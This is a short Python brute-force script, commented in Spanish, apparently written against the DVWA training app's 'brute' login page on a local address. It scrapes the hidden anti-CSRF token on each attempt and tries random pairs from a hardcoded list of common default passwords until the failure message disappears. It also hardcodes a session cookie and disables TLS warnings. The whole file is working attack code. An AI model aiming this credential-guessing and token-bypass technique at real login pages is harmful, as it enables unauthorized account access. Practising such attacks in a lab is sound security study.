#!/usr/bin/python3
#@author: manu
import requests

import random
import urllib3
from bs4 import BeautifulSoup
cookie={"PHPSESSID":"imso09f3lnku3m76eh34hqi0e4","security":"high"}


lista_passwords=["admin","password","manager","letmein","cisco","default","root","apc","pass","security","user","system","sys"]

sesion=requests.session()

password_encontrada=False

inicio=0
final=len(lista_passwords)-1
#deshabilitar el problema con las peticiones
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
while password_encontrada==False:
    url="http://127.8.0.1/vulnerabilities/brute/index.php"
    pagina_token=sesion.get(url)
    buscar_csrf=BeautifulSoup(pagina_token.text,'lxml')
    obtener_token=buscar_csrf.find('input', type='hidden').get('value')

    login_aleatorio=random.randint(inicio,final)
    contraseña_aleatoria=random.randint(inicio,final)
    url=f'http://127.8.0.1/vulnerabilities/brute/index.php?username={lista_passwords[login_aleatorio]}&password={lista_passwords[contraseña_aleatoria]}&Login=Login&user_token={obtener_token}#'
    peticion=sesion.get(url,cookies=cookie)


    print(url)
    #peticion=sesion.get(url)
    print(peticion.text)




    if "Username and/or password incorrect." in peticion.text:
        print("contraseña probada",lista_passwords[login_aleatorio],lista_passwords[contraseña_aleatoria])
        pass
    else:
            print("contraseña encontrada",lista_passwords[login_aleatorio],lista_passwords[contraseña_aleatoria])
            password_encontrada=True
